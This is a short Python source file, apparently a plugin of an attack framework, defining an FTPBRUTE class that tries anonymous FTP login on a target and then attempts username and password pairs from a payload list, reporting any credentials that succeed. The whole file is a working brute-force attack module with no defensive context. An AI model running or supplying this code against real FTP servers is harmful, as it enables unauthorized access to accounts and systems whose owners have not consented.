from ftplib import FTP

from ..core.base import ModBase


########################################################################
class FTPBRUTE(ModBase):
    """"""
    
    #----------------------------------------------------------------------
    def pre_attack(self):
        """"""
        client = FTP(self.target, timeout=5)
        client.login()
        
        return True, 'Annonymous Login Success'

    #----------------------------------------------------------------------
    def attack(self, payload):
        """"""
        username = payload[0]
        password = payload[1]
        
        try:
            client = FTP(self.target, timeout=5) 
            client.login(username, password)
        except Exception as e:
            return False
        
        return True, 'USERNAME: {username} | PASSWORD: {password}'.format(username=username,
                                                                          password=password)
        
        